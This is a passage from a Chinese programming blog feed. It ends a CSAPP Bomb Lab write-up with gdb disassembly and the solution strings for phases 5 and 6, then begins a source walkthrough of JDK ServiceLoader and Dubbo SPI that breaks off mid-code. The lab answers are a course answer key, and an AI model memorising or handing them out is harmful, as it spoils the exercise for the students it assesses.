0x00000000004010d7 &lt;+117&gt;: jmp 0x40108b &lt;phase_5+41&gt; 0x00000000004010d9 &lt;+119&gt;: mov 0x18(%rsp),%rax 0x00000000004010de &lt;+124&gt;: xor %fs:0x28,%rax 0x00000000004010e7 &lt;+133&gt;: je 0x4010ee &lt;phase_5+140&gt; 0x00000000004010e9 &lt;+135&gt;: callq 0x400b30 &lt;__stack_chk_fail@plt&gt; 0x00000000004010ee &lt;+140&gt;: add $0x20,%rsp 0x00000000004010f2 &lt;+144&gt;: pop %rbx 0x00000000004010f3 &lt;+145&gt;: retq(gdb) x/s 0x4024b00x4024b0 &lt;array.3449&gt;: &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;(gdb) x/s 0x40245e0x40245e: &quot;flyers&quot; 传入一个长度为六的字符串，依次取一个字符，截取它ASCII表上对应二进制的后四位，作为index。在 maduiersnfotvbyl... 这个字符串中以这个 index 为偏移量取字符。按照这样的规则从 maduiersnfotvbyl... 这个字符串中取出六个字符，组成新的字符串，要和 flyers 一样。这个还是很直接的吧，解题就是反过来的顺序。先根据 flyers 找出六个 index。再找个 ASCII 码表，根据 index 找到符合要求的字符。 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15m a d u i e r s n f o t v b y l 所以 flyers 对应的 index 为 9 15 14 5 6 7，所以输入ionefg 就是其中一个答案。 运行一下 阶段六先看汇编代码，这个比较长。 (gdb) disasDump of assembler code for function phase_6:=&gt; 0x00000000004010f4 &lt;+0&gt;: push %r14 0x00000000004010f6 &lt;+2&gt;: push %r13 0x00000000004010f8 &lt;+4&gt;: push %r12 0x00000000004010fa &lt;+6&gt;: push %rbp 0x00000000004010fb &lt;+7&gt;: push %rbx 0x00000000004010fc &lt;+8&gt;: sub $0x50,%rsp 0x0000000000401100 &lt;+12&gt;: mov %rsp,%r13 0x0000000000401103 &lt;+15&gt;: mov %rsp,%rsi 0x0000000000401106 &lt;+18&gt;: callq 0x40145c &lt;read_six_numbers&gt; # 读取6个值，从%rsi地址开始 0x000000000040110b &lt;+23&gt;: mov %rsp,%r14 0x000000000040110e &lt;+26&gt;: mov $0x0,%r12d =========================================================== LoopA-start 0x0000000000401114 &lt;+32&gt;: mov %r13,%rbp # %r12置0,并且%r13 %r14 %rbp 均和 %rsp 指向相同地址 0x0000000000401117 &lt;+35&gt;: mov 0x0(%r13),%eax 0x000000000040111b &lt;+39&gt;: sub $0x1,%eax 0x000000000040111e &lt;+42&gt;: cmp $0x5,%eax # 判断输入的数字是否为6个 0x0000000000401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt; 0x0000000000401123 &lt;+47&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401128 &lt;+52&gt;: add $0x1,%r12d # 将%r12加1，相当于index从1到5 0x000000000040112c &lt;+56&gt;: cmp $0x6,%r12d # 判断%r12是否等于6，等于6就跳转 0x0000000000401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt; 0x0000000000401132 &lt;+62&gt;: mov %r12d,%ebx # 将index移到到%ebx ----------------------------------------------------------- LoopB-start 0x0000000000401135 &lt;+65&gt;: movslq %ebx,%rax # 将%ebx移动到%rax = index 0x0000000000401138 &lt;+68&gt;: mov (%rsp,%rax,4),%eax # 获取输入的6个值 0x000000000040113b &lt;+71&gt;: cmp %eax,0x0(%rbp) # 判端(%rbp)这个值于(%rbp)的第%eax的值是否相等，不相等继续 0x000000000040113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt; 0x0000000000401140 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401145 &lt;+81&gt;: add $0x1,%ebx # index加1 0x0000000000401148 &lt;+84&gt;: cmp $0x5,%ebx # index &lt;= 5 0x000000000040114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt; # 跳转到65 ----------------------------------------------------------- LoopB-end 0x000000000040114d &lt;+89&gt;: add $0x4,%r13 # %r13加4，指向下一个数，判断所有数都不相等 0x0000000000401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt; # 跳转到32 ============================================================ LoopA-end 0x0000000000401153 &lt;+95&gt;: lea 0x18(%rsp),%rsi # 将 %rsi 指向栈中跳过读入数据位置作为结束标记,并且 %r14 仍和 %rsp 指向同一个位置 0x0000000000401158 &lt;+100&gt;: mov %r14,%rax # 将%r14复制到%rax ============================================================ LoopC-start 0x000000000040115b &lt;+103&gt;: mov $0x7,%ecx # 将0x7复制到%exc 0x0000000000401160 &lt;+108&gt;: mov %ecx,%edx # 将0x7复制到%edx 0x0000000000401162 &lt;+110&gt;: sub (%rax),%edx # 7减去%rax地址的数，也是%rsp的第i个数 0x0000000000401164 &lt;+112&gt;: mov %edx,(%rax) # 在把这个数替换了 0x0000000000401166 &lt;+114&gt;: add $0x4,%rax # 指向下一个数 0x000000000040116a &lt;+118&gt;: cmp %rsi,%rax # 是否全部循环完了 0x000000000040116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt; ============================================================ LoopC-end 0x000000000040116f &lt;+123&gt;: mov $0x0,%esi # 将%rsi设置为0 0x0000000000401174 &lt;+128&gt;: jmp 0x401197 &lt;phase_6+163&gt; # 获取数据%ecx，和%rdx是一个地址，是一个链表 0x0000000000401176 &lt;+130&gt;: mov 0x8(%rdx),%rdx # 将0x8(%rdx)存的内容复制到%rdx，指向下一个 0x000000000040117a &lt;+134&gt;: add $0x1,%eax # %eax加1 0x000000000040117d &lt;+137&gt;: cmp %ecx,%eax # %ecx和%eax 是否相等 0x000000000040117f &lt;+139&gt;: jne 0x401176 &lt;phase_6+130&gt; # 不相等，继续遍历 0x0000000000401181 &lt;+141&gt;: jmp 0x401188 &lt;phase_6+148&gt; # 相等，跳转到148 0x0000000000401183 &lt;+143&gt;: mov $0x6032d0,%edx # 重置链表首地址 0x0000000000401188 &lt;+148&gt;: mov %rdx,0x20(%rsp,%rsi,2) # 将%rdx的值复制到0x20(%rsp,%rsi,2) 0x000000000040118d &lt;+153&gt;: add $0x4,%rsi # 遍历下一个 0x0000000000401191 &lt;+157&gt;: cmp $0x18,%rsi 0x0000000000401195 &lt;+161&gt;: je 0x4011ab &lt;phase_6+183&gt; 0x0000000000401197 &lt;+163&gt;: mov (%rsp,%rsi,1),%ecx # 将 (%rsp + %rsi * 1) 数据复制到%ecx，我们前面构造的6个数字 0x000000000040119a &lt;+166&gt;: cmp $0x1,%ecx # 是否小于1 0x000000000040119d &lt;+169&gt;: jle 0x401183 &lt;phase_6+143&gt; # 如果小于等于1，%eax指向链表首地址 0x000000000040119f &lt;+171&gt;: mov $0x1,%eax # 将%eax设置为1 0x00000000004011a4 &lt;+176&gt;: mov $0x6032d0,%edx # 将%rdx指向内存 $0x6032d 0x00000000004011a9 &lt;+181&gt;: jmp 0x401176 &lt;phase_6+130&gt; --------------------------------------------------------- 0x00000000004011ab &lt;+183&gt;: mov 0x20(%rsp),%rbx # 将0x20(%rsp)链表信息复制到%rbx 0x00000000004011b0 &lt;+188&gt;: lea 0x28(%rsp),%rax # 将%rax指向下一个链表 0x00000000004011b5 &lt;+193&gt;: lea 0x50(%rsp),%rsi # 将%rsi指向保存链表地址的末地址 0x00000000004011ba &lt;+198&gt;: mov %rbx,%rcx 0x00000000004011bd &lt;+201&gt;: mov (%rax),%rdx 0x00000000004011c0 &lt;+204&gt;: mov %rdx,0x8(%rcx) 0x00000000004011c4 &lt;+208&gt;: add $0x8,%rax 0x00000000004011c8 &lt;+212&gt;: cmp %rsi,%rax 0x00000000004011cb &lt;+215&gt;: je 0x4011d2 &lt;phase_6+222&gt; 0x00000000004011cd &lt;+217&gt;: mov %rdx,%rcx 0x00000000004011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt; --------------------------------------------------------- 0x00000000004011d2 &lt;+222&gt;: movq $0x0,0x8(%rdx) 0x00000000004011da &lt;+230&gt;: mov $0x5,%ebp 0x00000000004011df &lt;+235&gt;: mov 0x8(%rbx),%rax # 将%rax指向%rbx下一个节点 0x00000000004011e3 &lt;+239&gt;: mov (%rax),%eax 0x00000000004011e5 &lt;+241&gt;: cmp %eax,(%rbx) # 比较每个节点是否是递减 0x00000000004011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt; 0x00000000004011e9 &lt;+245&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x00000000004011ee &lt;+250&gt;: mov 0x8(%rbx),%rbx 0x00000000004011f2 &lt;+254&gt;: sub $0x1,%ebp 0x00000000004011f5 &lt;+257&gt;: jne 0x4011df &lt;phase_6+235&gt; 0x00000000004011f7 &lt;+259&gt;: add $0x50,%rsp 0x00000000004011fb &lt;+263&gt;: pop %rbx 0x00000000004011fc &lt;+264&gt;: pop %rbp 0x00000000004011fd &lt;+265&gt;: pop %r12 0x00000000004011ff &lt;+267&gt;: pop %r13 0x0000000000401201 &lt;+269&gt;: pop %r14 0x0000000000401203 &lt;+271&gt;: retq(gdb) x/24xw 0x006032d0(gdb) x/24xw 0x006032d0 # 链表为 12 Byte 分别为 int int 指向下一个链表的地址0x6032d0 &lt;node1&gt;: 0x0000014c 0x00000001 0x006032e0 0x000000000x6032e0 &lt;node2&gt;: 0x000000a8 0x00000002 0x006032f0 0x000000000x6032f0 &lt;node3&gt;: 0x0000039c 0x00000003 0x00603300 0x000000000x603300 &lt;node4&gt;: 0x000002b3 0x00000004 0x00603310 0x000000000x603310 &lt;node5&gt;: 0x000001dd 0x00000005 0x00603320 0x000000000x603320 &lt;node6&gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 主要过程分为以下几步： 获取 6 个数字 判断每个数字都大于0且小于7，并且都不相同 交换一下位子，arr[i] 与 arr[7-i] 的数交换一下 按照获取 arr 的排序的值，把对应的链表进行重新排列 重排之后的链表要递减 最后我们看 0x006032d0 地址链表的值，大小顺序为3 4 5 6 1 2 然后我们只要输入4 3 2 1 6 5 就可以。 最后我们看看结果，发现已经全部通过了。 总结做完这个 lab ，学习到了 gdb 调试方法，对汇编更加深入的了解，总体来说这个实验还是挺有意思的。 参考 深入理解计算机系统 Bomb Lab CSAPP 之 Bomb Lab CSAPP bomb lab 问题","link":"/2020/10/31/CSAPP_Bomb_Lab/"},{"title":"Dubbo SPI源码分析","text":"对于一个优秀的框架需要很好的扩展性，给出一个接口，自己可以给出默认实现，同时也允许其他人实现拓展。即“对扩展开放，对修改封闭”的原则。Dubbo 采用微内核+插件的方式来实现，微内核架构中，内核通常采用 Factory、IoC、OSGi 等方式管理插件生命周期，Dubbo 最终决定采用 SPI 机制来加载插件，Dubbo SPI 参考 JDK 原生的 SPI 机制，进行了性能优化以及功能增强。 我们来看看 SPI 定义： Service Provider Interface (SPI) is an API intended to be implemented or extended by a third party. It can be used to enable framework extension and replaceable components. JDK SPIJDK SPI 最比较常见的在访问数据库会使用到java.sql.Driver这个接口，不同的数据库产商会有不同的实现，JDK SPI机制可以为某个接口寻找服务实现。 JDK SPI 机制我们先看一个例子，模拟连接数据库，先定义一个 Driver 接口。 package com.cuzz.api;public interface Driver { void connect(String url);} 然后不同的产商有不同的实现，以 mysql 和 oracle 两个实现。 package com.cuzz.mysql;import com.cuzz.api.Driver;public class MysqlDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect mysql: &quot; + url); }}// -----------------package com.cuzz.oracle;import com.cuzz.api.Driver;public class OracleDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect oracle: &quot; + url); }} 在项目的 resources/META-INF/services 目录下添加一个名为 com.cuzz.api.Driver 的文件，这是 JDK SPI 需要读取的配置文件，具体内容如下： com.cuzz.mysql.MysqlDrivercom.cuzz.oracle.OracleDriver 加载配置： public class Main { public static void main(String[] args) { // Java spi 机制 ServiceLoader&lt;Driver&gt; serviceLoader = ServiceLoader.load(Driver.class); System.out.println(serviceLoader); Iterator&lt;Driver&gt; iterator = serviceLoader.iterator(); while (iterator.hasNext()) { Driver driver = iterator.next(); driver.connect(&quot;localhost:3306&quot;); } }} 运行结果： java.util.ServiceLoader[com.cuzz.api.Driver]connect mysql: localhost:3306connect oracle: localhost:3306 JDK SPI 源码分析我们从ServiceLoader&lt;Driver&gt; serviceLoader = ServiceLoader.load(Driver.class);定位到ServiceLoader构造方法中的java.util.ServiceLoader#reload方法 // 前缀private static final String PREFIX = &quot;META-INF/services/&quot;;// The class or interface representing the service being loadedprivate final Class&lt;S&gt; service;// The class loader used to locate, load, and instantiate providersprivate final ClassLoader loader;// The access control context taken when the ServiceLoader is createdprivate final AccessControlContext acc;// Cached providers, in instantiation order// 缓存private LinkedHashMap&lt;String,S&gt; providers = new LinkedHashMap&lt;&gt;();// The current lazy-lookup iterator// 懒加载迭代器private LazyIterator lookupIterator;public void reload() { providers.clear(); lookupIterator = new LazyIterator(service, loader);} 重点看看这个 LazyIterator 类，这是一个内部类，主要以懒加载形式实现。Iterator 这个接口需要实现 Iterator#hasNext 方法和 Iterator#next 方法，hasNext方法调用了LazyIterator#hasNextService，而next方法调用LazyIterator#nextService。 private class LazyIterator implements Iterator&lt;S&gt; { Class&lt;S&gt; service; ClassLoader loader; // 像这样的URL file:/Users/cuzz/Projects/Java/dubbo/cuzz-demo/cuzz-demo-spi/target/classes/META-INF/services/com.cuzz.api.Driver Enumeration&lt;URL&gt; configs = null; Iterator&lt;String&gt; pending = null; String nextName = null; private LazyIterator(Class&lt;S&gt; service, ClassLoader loader) { this.service = service; this.loader = loader; } private boolean hasNextService() { if (nextName != null) { return true; } // 第一次获取，config 为空开始加载文件 if (configs == null) { try { // 获取文件名 META-INF/services/com.cuzz.api.Driver String fullName = PREFIX + service.getName(); // 加载配置路径 if (loader == null) configs = ClassLoader.getSystemResources(fullName); else configs = loader.getResources(fullName); } catch (IOException x) { fail(service, &quot;Error locating configuration files&quot;, x); } } while ((pending == null) || !pending.hasNext()) { if (!configs.hasMoreElements()) { return false; } // 解析文件 pending = parse(service, configs.nextElement()); } // 把实现类的名称记录下来 com.cuzz.mysql.MysqlDriver nextName = pending.next(); return true; } private S nextService() { if (!hasNextService()) throw new NoSuchElementException(); // 存一个备份 String cn = nextName; nextName = null; Class&lt;?&gt; c = null; try { // 通过反射获取该实现类 c = Class.forName(cn, false, loader); } catch (ClassNotFoundException x) { fail(service, &quot;Provider &quot; + cn + &quot; not found&quot;); } if (!service.isAssignableFrom(c)) { fail(service, &quot;Provider &quot; + cn + &quot; not a subtype&quot;); } try { S p = service.cast(c.newInstance()); providers.put(cn, p); return p; } catch (Throwable x) { fail(service, &quot;Provider &quot; + cn + &quot; could not be instantiated&quot;, x); } throw new Error(); // This cannot happen } public boolean hasNext() { if (acc == null) { return hasNextService(); } else { PrivilegedAction&lt;Boolean&gt; action = new PrivilegedAction&lt;Boolean&gt;() { public Boolean run() { return hasNextService(); } }; return AccessController.doPrivileged(action, acc); } } public S next() { if (acc == null) { return nextService(); } else { PrivilegedAction&lt;S&gt; action = new PrivilegedAction&lt;S&gt;() { public S run() { return nextService(); } }; return AccessController.doPrivileged(action, acc); } } public void remove() { throw new UnsupportedOperationException(); }} 最后我们来 ServiceLoader#iterator 这个方法是怎么实现的，主要是先走缓存，在走懒加载。 public Iterator&lt;S&gt; iterator() { return new Iterator&lt;S&gt;() { Iterator&lt;Map.Entry&lt;String,S&gt;&gt; knownProviders = providers.entrySet().iterator(); public boolean hasNext() { // 先走缓存，在走懒加载 if (knownProviders.hasNext()) return true; return lookupIterator.hasNext(); } public S next() { // 先走缓存，在走懒加载 if (knownProviders.hasNext()) return knownProviders.next().getValue(); return lookupIterator.next(); } public void remove() { throw new UnsupportedOperationException(); } };} JDK SPI 在 JDBC 中的应用当我们引入mysql 驱动时候，在 META-INF/services 目录下，有一个 java.sql.Driver 文件，内容如下。 om.mysql.jdbc.Drivercom.mysql.fabric.jdbc.FabricMySQLDriver 当我们要链接 JDBC 会通过 DriverManager驱动管理来连接。 String url = &quot;jdbc:mysql://localhost:3306/demo?useSSL=true&amp;useUnicode=true&amp;characterEncoding=UTF-8&quot;;String username = &quot;root&quot;;String pwd = &quot;12345&quot;;Connection conn = DriverManager.getConnection(url, username, pwd); DriverManager类的静态方法在 JVM加载类的时候会执行，执行 loadInitialDrivers 方法。 private final static CopyOnWriteArrayList&lt;DriverInfo&gt; registeredDrivers = new CopyOnWriteArrayList&lt;&gt;();static { loadInitialDrivers(); println(&quot;JDBC DriverManager initialized&quot;); } private static void loadInitialDrivers() { // 看看系统属性是否配置了jdbc.drivers String drivers; try { drivers = AccessController.doPrivileged(new PrivilegedAction&lt;String&gt;() { public String run() { return System.getProperty(&quot;jdbc.drivers&quot;); } }); } catch (Exception ex) { drivers = null; } // If the driver is packaged as a Service Provider, load it. // Get all the drivers through the classloader // exposed as a java.sql.Driver.class service. // ServiceLoader.load() replaces the sun.misc.Providers() AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() { public Void run() { // JDK SPI 方式加载并实例化 ServiceLoader&lt;Driver&gt; loadedDrivers = ServiceLoader.load(Driver.class); Iterator&lt;Driver&gt; driversIterator = loadedDrivers.iterator(); /* Load these drivers, so that they can be instantiated. * It may be the case that the driver class may not be there * i.e. there may be a packaged driver with the service class * as implementation of java.sql.Driver but the actual class * may be missing. In that case a java.util.ServiceConfigurationError * will be thrown at runtime by the VM trying to locate * and load the service. * * Adding a try catch block to catch those runtime errors * if driver not available in classpath but it's * packaged as service and that service is there in classpath. */ try{ while(driversIterator.hasNext()) { driversIterator.next(); } } catch(Throwable t) { // Do nothing } return null; } }); println(&quot;DriverManager.initialize: jdbc.drivers = &quot; + drivers); if (drivers == null || drivers.equals(&quot;&quot;)) { return; } // 配置了jdbc.dirvers属性通过反射实例化 String[] driversList = drivers.split(&quot;:&quot;); println(&quot;number of Drivers:&quot; + driversList.length); for (String aDriver : driversList) { try { println(&quot;DriverManager.Initialize: loading &quot; + aDriver); Class.forName(aDriver, true, ClassLoader.getSystemClassLoader()); } catch (Exception ex) { println(&quot;DriverManager.Initialize: load failed: &quot; + ex); } }} 实例化 java.sql.Driver 接口实现类，在MySQL提供的，会吧自己注册到 DriverManager 中。 package com.mysql.jdbc;import java.sql.SQLException;public class Driver extends NonRegisteringDriver implements java.sql.Driver { // Register ourselves with the DriverManager static { try { // 注册到DriverManager的CopyOnWriteArrayList中 java.sql.DriverManager.registerDriver(new Driver()); } catch (SQLException E) { throw new RuntimeException(&quot;Can't register driver!&quot;); } }} 最后调用 DriverManager#getConnection 从注册中获取连接。 // Worker method called by the public getConnection() methods.private static Connection getConnection( String url, java.util.Properties info, Class&lt;?&gt; caller) throws SQLException { // 循环从注册中获取，获取到一个就返回。 for(DriverInfo aDriver : registeredDrivers) { try { Connection con = aDriver.driver.connect(url, info); if (con != null) { // Success! println(&quot;getConnection returning &quot; + aDriver.driver.getClass().getName()); return (con); } } catch (SQLException ex) { if (reason == null) { reason = ex; } } }} JDK SPI 的缺点 虽然ServiceLoader也算是使用的延迟加载，但是基本只能通过遍历全部获取，也就是接口的实现类全部加载并实例化一遍。如果你并不想用某些实现类，它也被加载并实例化了，这就造成了浪费。 获取某个实现类的方式不够灵活，只能通过Iterator形式获取，不能根据某个参数来获取对应的实现类。 Dubbo SPIDubbo SPI 对 JDK SPI 进行了扩展，由原来的提供者类的全限定名列表改成了 K-V 形式，如果 SPI 配置文件中定义了多个实现类，而我们只需要使用其中一个实现类时，就会生成不必要的对象，除此之外 Dubbo 对 JDK SPI 做了三个方面的扩展： 方便获取扩展实现：JDK SPI仅仅通过接口类名获取所有实现，而 ExtensionLoader 则通过接口类名和key值获取一个实现。 IOC依赖注入功能：Adaptive实现，就是生成一个代理类，这样就可以根据实际调用时的一些参数动态决定要调用的类了。 采用装饰器模式进行功能增强，自动包装实现，这种实现的类一般是自动激活的，常用于包装类，比如：Protocol的两个实现类：ProtocolFilterWrapper、ProtocolListenerWrapper。 Dubbo 按照 SPI 配置文件的用途，将其分成了三类目录。 META-INF/services/ 目录：该目录下的 SPI 配置文件用来兼容 JDK SPI 。 META-INF/dubbo/ 目录：该目录用于存放用户自定义 SPI 配置文件。 META-INF/dubbo/internal/ 目录：该目录用于存放 Dubbo 内部使用的 SPI 配置文件。 Dubbo SPI 机制定义一个接口，用 @SPI 标识表示是 Dubbo SPI。 @SPIpublic interface Driver { void connect(String url);} 实现类： package com.cuzz.mysql;import com.cuzz.api.Driver;public class MysqlDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect mysql: &quot; + url); }}// -----------------package com.cuzz.oracle;import com.cuzz.api.Driver;public class OracleDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect oracle: &quot; + url); }} 在项目的 resources/META-INF/dubbo 目录下添加一个名为 com.cuzz.api.Driver 的文件，这是 Dubbo SPI 需要读取的配置文件，与JDK SPI 不一样是KV形式，具体内容如下： mysqlDriver=com.cuzz.mysql.MysqlDriveroracleDriver=com.cuzz.oracle.OracleDriver 获取实现类： public class App { public static void main(String[] args) { Driver driver = ExtensionLoader.getExtensionLoader(Driver.class).getExtension(&quot;mysqlDriver&quot;); driver.connect(&quot;localhost:3306&quot;); }} 输出： connect mysql: localhost:3306 Dubbo SPI 主流程我们先从获取 ExtensLoader 实例开始，ExtensionLoader#getExtensionLoader /** * Dubbo 中一个扩展接口对应一个 ExtensionLoader 实例，该集合缓存了全部 ExtensionLoader 实例， * 其中的 Key 为扩展接口，Value 为加载其扩展实现的 ExtensionLoader 实例。 */private static final ConcurrentMap&lt;Class&lt;?&gt;, ExtensionLoader&lt;?&gt;&gt; EXTENSION_LOADERS = new ConcurrentHashMap&lt;&gt;(64);public static &lt;T&gt; ExtensionLoader&lt;T&gt; getExtensionLoader(Class&lt;T&gt; type) { if (type == null) { throw new IllegalArgumentException(&quot;Extension type == null&quot;); } // 必须为接口 if (!type.isInterface()) { throw new IllegalArgumentException(&quot;Extension type (&quot; + type + &quot;) is not an interface!&quot;); } // 必须有@SPI接口 if (!withExtensionAnnotation(type)) { throw new IllegalArgumentException(&quot;Extension type (&quot; + type + &quot;) is not an extension, because it is NOT annotated with @&quot; + SPI.class.getSimpleName() + &quot;!&quot;); } // 从缓存中获取 ExtensionLoader&lt;T&gt; loader = (ExtensionLoader&lt;T&gt;) EXTENSION_LOADERS.get(type); if (loader == null) { // 如果已经存在 key 就不往 map 中添加 EXTENSION_LOADERS.putIfAbsent(type, new ExtensionLoader&lt;T&gt;(type)); // ---&gt; loader = (ExtensionLoader&lt;T&gt;) EXTENSION_LOADERS.get(type); } return loader;} 接着看看 ExtensionLoader#ExtensionLoader 构造方法，如果 type 不为 ExtensionFactory.class 初始化拓展适配器。 /*** 表示拓展类实例工厂，可以通过工厂创建实例*/private final ExtensionFactory objectFactory;private ExtensionLoader(Class&lt;?&gt; type) { this.type = type; // 初始化拓展适配器 objectFactory = (type == ExtensionFactory.class ? null : ExtensionLoader.getExtensionLoader(ExtensionFactory.class).getAdaptiveExtension());} 获取拓展实现类，ExtensionLoader#getExtension /*** 缓存了该 ExtensionLoader 加载的扩展名与扩展实现对象之间的映射关系。*/private final ConcurrentMap&lt;String, Holder&lt;Object&gt;&gt; cachedInstances = new ConcurrentHashMap&lt;&gt;();public T getExtension(String name) { if (StringUtils.isEmpty(name)) { throw new IllegalArgumentException(&quot;Extension name == null&quot;); } // @SPI中value有值，如@SPI(&quot;dubbo&quot;) 默认获取 key 为 dubbo 的 Extension if (&quot;true&quot;.equals(name)) { return getDefaultExtension(); } // getOrCreateHolder()方法中封装了查找cachedInstances缓存的逻辑 final Holder&lt;Object&gt; holder = getOrCreateHolder(name); Object instance = holder.get(); if (instance == null) { synchronized (holder) { // 双重锁防止并发 instance = holder.get(); if (instance == null) { instance = createExtension(name); // ---&gt; holder.set(instance); } } } return (T) instance;}private Holder&lt;Object&gt; getOrCreateHolder(String name) { Holder&lt;Object&gt; holder = cachedInstances.get(name); if (holder == null) { cachedInstances.putIfAbsent(name, new Holder&lt;&gt;()); holder = cachedInstances.get(name); } return holder;} ExtensionLoader#createExtension 方法中完成了 SPI 配置文件的查找以及相应扩展实现类的实例化，同时还实现了自动装配以及自动 Wrapper 包装等功能。 private T createExtension(String name) { // 获取 cachedClasses 缓存，根据扩展名从 cachedClasses 缓存中获取扩展实现类。 Class&lt;?&gt; clazz = getExtensionClasses().get(name); // ---&gt; 1 if (clazz == null) { throw findException(name); } try { // 根据扩展实现类从 EXTENSION_INSTANCES 缓存中查找相应的实例。如果查找失败，会通过反射创建扩展实现对象。 T instance = (T) EXTENSION_INSTANCES.get(clazz); if (instance == null) { EXTENSION_INSTANCES.putIfAbsent(clazz, clazz.newInstance()); instance = (T) EXTENSION_INSTANCES.get(clazz); } // 自动装配扩展实现对象中的属性（即调用其 setter）。这里涉及 ExtensionFactory 以及自动装配的相关内容。 injectExtension(instance); // 自动包装扩展实现对象。这里涉及 Wrapper 类以及自动包装特性的相关内容. Set&lt;Class&lt;?&gt;&gt; wrapperClasses = cachedWrapperClasses; if (CollectionUtils.isNotEmpty(wrapperClasses)) { for (Class&lt;?&gt; wrapperClass : wrapperClasses) { instance = injectExtension((T) wrapperClass.getConstructor(type).newInstance(instance)); } } // 如果扩展实现类实现了 Lifecycle 接口，在 initExtension() 方法中会调用 initialize() 方法进行初始化。 initExtension(instance); return instance; } catch (Throwable t) { throw new IllegalStateException(&quot;Extension instance (name: &quot; + name + &quot;, class: &quot; + type + &quot;) couldn't be instantiated: &quot; + t.getMessage(), t); }} Dubbo SPI 获取拓展类ExtensionLoader#getExtensionClasses /*** 缓存了该 ExtensionLoader 加载的扩展名与扩展实现类之间的映射关系。cachedNames 集合的反向关系缓存。*/private final Holder&lt;Map&lt;String, Class&lt;?&gt;&gt;&gt; cachedClasses = new Holder&lt;&gt;();private Map&lt;String, Class&lt;?&gt;&gt; getExtensionClasses() { // 先从缓存中获取 Map&lt;String, Class&lt;?&gt;&gt; classes = cachedClasses.get(); if (classes == null) { synchronized (cachedClasses) { classes = cachedClasses.get(); if (classes == null) { // 加载类 classes = loadExtensionClasses(); // ---&gt; cachedClasses.set(classes); } } } return classes;} ExtensionLoader#loadExtensionClasses /*** synchronized in getExtensionClasses*/private Map&lt;String, Class&lt;?&gt;&gt; loadExtensionClasses() { // 只能有一个默认值 cacheDefaultExtensionName(); // 加载的扩展名与扩展实现类之间的映射关系 Map&lt;String, Class&lt;?&gt;&gt; extensionClasses = new HashMap&lt;&gt;(); for (LoadingStrategy strategy : strategies) { loadDirectory(extensionClasses, strategy.directory(), type.getName(), strategy.preferExtensionClassLoader(), strategy.overridden(), strategy.excludedPackages()); // ---&gt; loadDirectory(extensionClasses, strategy.directory(), type.getName().replace(&quot;org.apache&quot;, &quot;com.alibaba&quot;), strategy.preferExtensionClassLoader(), strategy.overridden(), strategy.excludedPackages()); } return extensionClasses;}private void cacheDefaultExtensionName() { final SPI defaultAnnotation = type.getAnnotation(SPI.class); if (defaultAnnotation == null) { return; } String value = defaultAnnotation.value(); // 只能有一个车默认值，这种 @SPI(&quot;dubbo,http&quot;) 就会报错 if ((value = value.trim()).length() &gt; 0) { String[] names = NAME_SEPARATOR.split(value); if (names.length &gt; 1) { throw new IllegalStateException(&quot;More than 1 default extension name on extension &quot; + type.getName() + &quot;: &quot; + Arrays.toString(names)); } if (names.length == 1) { cachedDefaultName = names[0]; } }} ExtensionLoader#loadDirectory private void loadDirectory(Map&lt;String, Class&lt;?&gt;&gt; extensionClasses, String dir, String type, boolean extensionLoaderClassLoaderFirst, boolean overridden, String... excludedPackages) { String fileName = dir + type; try { Enumeration&lt;java.net.URL&gt; urls = null; ClassLoader classLoader = findClassLoader(); // try to load from ExtensionLoader's ClassLoader first if (extensionLoaderClassLoaderFirst) { ClassLoader extensionLoaderClassLoader = ExtensionLoader.class.getClassLoader(); if (ClassLoader.getSystemClassLoader() != extensionLoaderClassLoader) { urls = extensionLoaderClassLoader.getResources(fileName); } } if (urls == null || !urls.hasMoreElements()) { if (classLoader != null) { urls = classLoader.getResources(fileName); } else { urls = ClassLoader.getSystemResources(fileName); } } // 循环获取 if (urls != null) { while (urls.hasMoreElements()) { java.net.URL resourceURL = urls.nextElement(); loadResource(extensionClasses, classLoader, resourceURL, overridden, excludedPackages); // ---&gt; } } } catch (Throwable t) { logger.error(&quot;Exception occurred when loading extension class (interface: &quot; + type + &quot;, description file: &quot; + fileName + &quot;).&quot;, t); }} ExtensionLoader#loadResource private void loadResource(Map&lt;String, Class&lt;?&gt;&gt; extensionClasses, ClassLoader classLoader, java.net.URL resourceURL, boolean overridden, String... excludedPackages) { try { // 必须 utf-8 格式 try (BufferedReader reader = new BufferedReader(new InputStreamReader(resourceURL.openStream(), StandardCharsets.UTF_8))) { String line; while ((line = reader.readLine()) != null) { final int ci = line.indexOf('#'); if (ci &gt;= 0) { // 去掉注释 line = line.substring(0, ci); } line = line.trim(); if (line.length() &gt; 0) { try { String name = null; int i = line.indexOf('='); if (i &gt; 0) { name = line.substring(0, i).trim(); line = line.substring(i + 1).trim(); } // 没有被排除外 if (line.length() &gt; 0 &amp;&amp; !isExcluded(line, excludedPackages)) { loadClass(extensionClasses, resourceURL, Class.forName(line, true, classLoader), name, overridden); // ---&gt; } } catch (Throwable t) { IllegalStateException e = new IllegalStateException(&quot;Failed to load extension class (interface: &quot; + type + &quot;, class line: &quot; + line + &quot;) in &quot; + resourceURL + &quot;, cause: &quot; + t.getMessage(), t); exceptions.put(line, e); } } } } } catch (Throwable t) { logger.error(&quot;Exception occurred when loading extension class (interface: &quot; + type + &quot;, class file: &quot; + resourceURL + &quot;) in &quot; + resourceURL, t); }} ExtensionLoader#loadClass private void loadClass(Map&lt;String, Class&lt;?&gt;&gt; extensionClasses, java.net.URL resourceURL, Class&lt;?&gt; clazz, String name, 